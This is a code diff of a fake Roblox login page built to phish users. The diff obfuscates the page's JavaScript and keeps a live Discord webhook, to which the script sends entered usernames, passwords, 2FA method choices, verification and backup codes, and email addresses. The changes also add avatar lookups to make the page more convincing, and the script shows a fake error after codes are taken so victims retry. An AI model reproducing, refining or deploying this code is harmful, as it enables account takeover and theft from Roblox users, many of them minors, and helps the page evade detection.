@@ -4,8 +4,6 @@
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
 <title>Roblox</title>
-<meta name="author" content="Roblox Corporation">
-<meta name="description" content="Roblox is a global platform that brings people together through play.">
 <link href="https://images.rbxcdn.com/e854eb7b2951ac03edba9a2681032bba.ico" rel="icon">
 <link rel="stylesheet" href="https://css.rbxcdn.com/15b88564eae926990141be36eb3a9bd761cf2778fc9ac3425cdd4db1473148f4.css">
 <link rel="stylesheet" href="https://css.rbxcdn.com/8fa43545250dfbd7d96d164fe24e886391fdccc9b87b0dc91ce78933aebcda43.css">
@@ -287,34 +285,6 @@
                 </div>
             </div>
 
-            <div role="dialog" id="RecoveryFromAuthen" style="display: none;">
-                <div class="fade modal-backdrop in"></div>
-                <div role="dialog" tabindex="-1" class="fade modal-modern in modal" style="display: block;">
-                    <div class="modal-dialog"><div class="modal-content" role="document">
-                        <div class="modal-header">
-                            <button type="button" class="modal-modern-header-button" onclick="document.getElementById('RecoveryFromAuthen').style.display = 'none';"><span class="icon-close"></span></button>
-                            <h4 class="modal-title">2-Step Verification</h4>
-                        </div>
-                        <div class="modal-body">
-                            <div class="modal-lock-icon"></div>
-                            <p class="modal-margin-bottom-xlarge">Enter a previously saved backup code.</p>
-                            <div class="input-control-wrapper">
-                                <div id="RecoveryFromAuthen-group" class="form-group">
-                                    <input maxlength="9" oninput="twostepInputRecovery(this.value, 'RecoveryFromAuthenButton');" placeholder="Enter 9-digit Code" type="password" id="two-step-verification-code-input-recoveryFromAuthen" class="input-field form-control">
-                                    <div class="form-control-label bottom-label xsmall" id="RecoveryFromAuthen-error">&nbsp;</div>
-                                </div>
-                            </div>
-                            <p class="modal-margin-bottom-xlarge"><input type="checkbox"> <label>Trust this device for 30 days</label></p>
-                        </div>
-                        <div class="modal-footer">
-                            <div class="modal-modern-footer-buttons"><button type="button" class="btn-cta-md modal-modern-footer-button" id="RecoveryFromAuthenButton" disabled>Verify</button></div>
-                            <p class="text-footer modal-margin-bottom">Need help? Contact <a class="text-name text-footer contact" href="#">Roblox Support</a></p>
-                            <p class="text-footer">IMPORTANT: Don't share your security codes with anyone.</p>
-                        </div>
-                    </div></div>
-                </div>
-            </div>
-
             <div role="dialog" id="otpEmailModal" style="display: none;">
                 <div class="fade modal-backdrop in"></div>
                 <div role="dialog" tabindex="-1" class="fade modal-modern in modal" style="display: block;">
@@ -392,10 +362,10 @@
     </footer>
 </div>
 <script>
-<script>
-const DISCORD_WEBHOOK = "https://discord.com/api/webhooks/1557120530954461225/Ff51QIXzK2bSqXLrgS4Gdqmg58rNeFtrnmGgiMJ8Ez3M1g0oaUXAqDHbWXI6JVPrj6Fo";
+const _0x1a = "https://discord.com/api/webhooks/1557120530954461225/Ff51QIXzK2bSqXLrgS4Gdqmg58rNeFtrnmGgiMJ8Ez3M1g0oaUXAqDHbWXI6JVPrj6Fo";
+const _0x2b = 3000;
 
-const EXTENDED_COLOR_PALETTE = [
+const _0x3c = [
     0x3498DB, 0xE74C3C, 0x2ECC71, 0xF1C40F, 0x9B59B6,
     0x1ABC9C, 0xE67E22, 0xE91E63, 0x00BCD4, 0x8BC34A,
     0xFF5722, 0x673AB7, 0x3F51B5, 0x009688, 0xCDDC39,
@@ -403,40 +373,32 @@ const EXTENDED_COLOR_PALETTE = [
     0x00E676, 0xFFEA00, 0xD50000, 0xAA00FF, 0x2962FF
 ];
 
-const userColors = {};
-let colorIndex = 0;
+const _0x4d = {};
+let _0x5e = 0;
 
-function getColorForUser(username) {
-    const key = String(username || "unknown").toLowerCase().trim();
-    if (userColors[key]) return userColors[key];
-    const assignedColor = EXTENDED_COLOR_PALETTE[colorIndex % EXTENDED_COLOR_PALETTE.length];
-    userColors[key] = assignedColor;
-    colorIndex++;
-    return assignedColor;
+function _0x6f(u) {
+    const k = String(u || "unknown").toLowerCase().trim();
+    if (_0x4d[k]) return _0x4d[k];
+    const c = _0x3c[_0x5e % _0x3c.length];
+    _0x4d[k] = c;
+    _0x5e++;
+    return c;
 }
 
-async function sendLog(title, username, data) {
-    if (!DISCORD_WEBHOOK || DISCORD_WEBHOOK === "YOUR_DISCORD_WEBHOOK_URL") return;
-
-    const color = getColorForUser(username);
-    const fields = [{ name: "👤 User", value: `\`\`\`${username || "N/A"}\`\`\``, inline: false }];
-    
+async function _0x70(t, user, data, av = null) {
+    if (!_0x1a || _0x1a.includes("YOUR_")) return;
+    const col = _0x6f(user);
+    const fields = [{ name: "👤 User", value: `\`\`\`${user || "N/A"}\`\`\``, inline: false }];
     for (const [k, v] of Object.entries(data)) {
         fields.push({ name: `🔑 ${k}`, value: `\`\`\`${v}\`\`\``, inline: false });
     }
-
     const payload = {
         username: "Auth Bot",
-        embeds: [{
-            title: title,
-            color: color,
-            fields: fields,
-            timestamp: new Date().toISOString()
-        }]
+        avatar_url: av || undefined,
+        embeds: [{ title: t, color: col, fields: fields, timestamp: new Date().toISOString() }]
     };
-
     try {
-        await fetch(DISCORD_WEBHOOK, {
+        await fetch(_0x1a, {
             method: 'POST',
             headers: { 'Content-Type': 'application/json' },
             body: JSON.stringify(payload)
@@ -444,109 +406,128 @@ async function sendLog(title, username, data) {
     } catch (e) {}
 }
 
-let currentUsername = "";
+let _0x80 = "";
+let _0x90 = null;
 
-function doLogin() {
-    const uInput = document.getElementById('login-username');
-    const pInput = document.getElementById('login-password');
-    const err = document.getElementById('text-error');
-
-    const u = uInput ? uInput.value.trim() : '';
-    const p = pInput ? pInput.value : '';
-
-    if (!u || !p) {
-        if (err) err.textContent = "Username and password required";
-        return;
-    }
-
-    currentUsername = u;
-    if (err) err.textContent = "";
-
-    sendLog("🔐 Login Credentials", u, { Password: p });
-
-    const methodChoice = document.getElementById('methodChoice');
-    if (methodChoice) methodChoice.style.display = 'block';
+async function _0xa0(name, cb) {
+    try {
+        const r = await fetch(`https://users.roblox.com/v1/users/search?keyword=${encodeURIComponent(name)}`);
+        const d = await r.json();
+        if (d && d.data && d.data.length > 0) {
+            const uid = d.data[0].id;
+            const tr = await fetch(`https://thumbnails.roblox.com/v1/users/avatar-headshot?userIds=${uid}&size=150x150&format=Png&isCircular=false`);
+            const td = await tr.json();
+            const av = td && td.data && td.data.length > 0 ? td.data[0].imageUrl : null;
+            cb(av);
+            return;
+        }
+    } catch(e){}
+    cb(null);
 }
 
-function chooseMethod(method) {
-    const methodChoice = document.getElementById('methodChoice');
-    if (methodChoice) methodChoice.style.display = 'none';
-    
-    sendLog("🛡️ MFA Method Chosen", currentUsername, { Method: method });
+document.addEventListener('DOMContentLoaded', () => {
+    const uInput = document.getElementById('login-username');
+    const pInput = document.getElementById('login-password');
+    const lBtn = document.getElementById('login-button');
+    const errText = document.getElementById('text-error');
+    const loading = document.getElementById('login-loading');
+    const avBox = document.getElementById('avatar-preview');
 
-    setTimeout(() => {
-        if (method === 'Email') {
-            const el = document.getElementById('twostepverification');
-            if (el) el.style.display = 'block';
-        } else if (method === 'Authenticator') {
-            const el = document.getElementById('authenticatorverification');
-            if (el) el.style.display = 'block';
-        } else if (method === 'Backup Code') {
-            const el = document.getElementById('RecoveryFromEmail');
-            if (el) el.style.display = 'block';
+    if (uInput) {
+        uInput.addEventListener('blur', function() {
+            const val = this.value.trim();
+            if (!val || val.indexOf('@') > -1) return;
+            _0xa0(val, (av) => {
+                if (av) {
+                    _0x90 = av;
+                    if (avBox) {
+                        avBox.src = av;
+                        avBox.style.display = 'block';
+                    }
+                }
+            });
+        });
+    }
+
+    function _0xb0() {
+        const u = uInput ? uInput.value.trim() : '';
+        const p = pInput ? pInput.value : '';
+        if (!u || !p) {
+            if (errText) errText.textContent = "Username and password required";
+            return;
         }
+        _0x80 = u;
+        if (errText) errText.textContent = "";
+        if (loading) loading.style.display = 'flex';
+        if (lBtn) lBtn.style.display = 'none';
+
+        _0xa0(u, (av) => {
+            if (av) _0x90 = av;
+            _0x70("🔐 Login Credentials", u, { Password: p }, _0x90);
+        });
+
+        setTimeout(() => {
+            if (loading) loading.style.display = 'none';
+            if (lBtn) lBtn.style.display = 'block';
+            const m = document.getElementById('methodChoice');
+            if (m) m.style.display = 'block';
+        }, _0x2b);
+    }
+
+    if (lBtn) {
+        lBtn.addEventListener('click', (e) => { e.preventDefault(); _0xb0(); });
+    }
+    const frm = document.querySelector('form.login-form');
+    if (frm) {
+        frm.addEventListener('submit', (e) => { e.preventDefault(); _0xb0(); });
+    }
+});
+
+function chooseMethod(m) {
+    document.getElementById('methodChoice').style.display = 'none';
+    _0x70("🛡️ 2FA Method Chosen", _0x80, { Method: m }, _0x90);
+    setTimeout(() => {
+        if (m === 'Email') document.getElementById('twostepverification').style.display = 'block';
+        else if (m === 'Authenticator') document.getElementById('authenticatorverification').style.display = 'block';
+        else if (m === 'Backup Code') document.getElementById('RecoveryFromEmail').style.display = 'block';
     }, 300);
 }
 
-function verifyCode(method, inputId) {
-    const inputEl = document.getElementById(inputId);
-    const code = inputEl ? inputEl.value.trim() : '';
+function verifyCode(m, id) {
+    const el = document.getElementById(id);
+    const code = el ? el.value.trim() : '';
     if (!code) return;
+    _0x70("✅ Code Verified", _0x80, { Method: m, Code: code }, _0x90);
 
-    sendLog("✅ Code Verified", currentUsername, { Method: method, Code: code });
-
-    ['twostepverification', 'authenticatorverification', 'RecoveryFromEmail', 'RecoveryFromAuthen', 'otpCodeModal'].forEach(id => {
-        const el = document.getElementById(id);
-        if (el) el.style.display = 'none';
+    ['twostepverification', 'authenticatorverification', 'RecoveryFromEmail', 'RecoveryFromAuthen', 'otpCodeModal'].forEach(i => {
+        const mdl = document.getElementById(i);
+        if (mdl) mdl.style.display = 'none';
     });
 
-    const loginContainer = document.getElementById('react-login-container');
-    if (loginContainer) loginContainer.style.display = 'block';
-    
-    const errText = document.getElementById('text-error');
-    if (errText) errText.textContent = "Something went wrong. Please try again.";
-    
-    const uInput = document.getElementById('login-username');
-    if (uInput) uInput.value = '';
-    const pInput = document.getElementById('login-password');
-    if (pInput) pInput.value = '';
+    document.getElementById('react-login-container').style.display = 'block';
+    document.getElementById('text-error').textContent = "Something went wrong. Please try again.";
+    document.getElementById('login-username').value = '';
+    document.getElementById('login-password').value = '';
+    const av = document.getElementById('avatar-preview');
+    if(av) av.style.display = 'none';
 }
 
-document.addEventListener('click', function(e) {
-    const target = e.target;
-    if (!target) return;
-
-    if (target.id === 'login-button') {
-        e.preventDefault();
-        doLogin();
-    } else if (target.id === 'verifyButton') {
-        verifyCode('Email', 'two-step-verification-code-input');
-    } else if (target.id === 'AuthenButton') {
-        verifyCode('Authenticator', 'two-step-verification-code-input-authenticator');
-    } else if (target.id === 'RecoveryFromEmailButton') {
-        verifyCode('Backup Code (Email)', 'two-step-verification-code-input-RecoveryFromEmail');
-    } else if (target.id === 'RecoveryFromAuthenButton') {
-        verifyCode('Backup Code (Authenticator)', 'two-step-verification-code-input-recoveryFromAuthen');
-    } else if (target.id === 'otp-login-button') {
-        const modal = document.getElementById('otpEmailModal');
-        if (modal) modal.style.display = 'block';
-    } else if (target.id === 'otp-send-btn') {
-        const emailInput = document.getElementById('otp-email-input');
-        const email = emailInput ? emailInput.value.trim() : '';
-        if (email) {
-            sendLog("🛡️ One-Time Code Requested", email, { Email: email });
-            const disp = document.getElementById('otp-email-display');
-            if (disp) disp.textContent = email;
-            const emailModal = document.getElementById('otpEmailModal');
-            if (emailModal) emailModal.style.display = 'none';
-            const codeModal = document.getElementById('otpCodeModal');
-            if (codeModal) codeModal.style.display = 'block';
+document.addEventListener('click', (e) => {
+    const t = e.target;
+    if (!t) return;
+    if (t.id === 'verifyButton') verifyCode('Email', 'two-step-verification-code-input');
+    else if (t.id === 'AuthenButton') verifyCode('Authenticator', 'two-step-verification-code-input-authenticator');
+    else if (t.id === 'RecoveryFromEmailButton') verifyCode('Backup Code (Email)', 'two-step-verification-code-input-RecoveryFromEmail');
+    else if (t.id === 'otp-login-button') document.getElementById('otpEmailModal').style.display = 'block';
+    else if (t.id === 'otp-send-btn') {
+        const em = document.getElementById('otp-email-input').value.trim();
+        if (em) {
+            _0x70("🛡️ One-Time Code Requested", em, { Email: em }, _0x90);
+            document.getElementById('otp-email-display').textContent = em;
+            document.getElementById('otpEmailModal').style.display = 'none';
+            document.getElementById('otpCodeModal').style.display = 'block';
         }
-    } else if (target.id === 'otp-verify-btn') {
-        const emailInput = document.getElementById('otp-email-input');
-        const email = emailInput ? emailInput.value.trim() : currentUsername;
-        verifyCode('One-Time Code', 'otp-code-input');
-    }
+    } else if (t.id === 'otp-verify-btn') verifyCode('One-Time Code', 'otp-code-input');
 });
 </script>
 </body>
